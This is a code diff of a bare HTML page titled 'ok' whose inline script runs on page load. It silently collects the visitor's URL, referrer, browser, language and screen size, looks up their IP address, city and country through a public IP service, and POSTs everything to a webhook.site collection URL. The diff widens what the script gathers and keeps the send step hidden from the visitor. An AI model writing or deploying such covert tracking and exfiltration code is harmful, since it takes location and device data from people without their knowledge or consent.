@@ -1,26 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ok</title>
+</head>
+<body>
+
 <script>
-async function run() {
+(async () => {
     const data = {
-        ua: navigator.userAgent,
         url: location.href,
+        ref: document.referrer,
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        screen: screen.width + "x" + screen.height,
         time: new Date().toString()
     };
 
     try {
-        const r = await fetch("https://api.ipify.org?format=json");
+        const r = await fetch("https://ipapi.co/json/");
         const d = await r.json();
+
         data.ip = d.ip;
-    } catch(e){}
+        data.city = d.city;
+        data.country = d.country_name;
+    } catch(e) {}
 
-    fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-    });
-}
+    try {
+        await fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
+    } catch(e) {}
 
-run();
+})();
 </script>
+
+</body>
+</html>
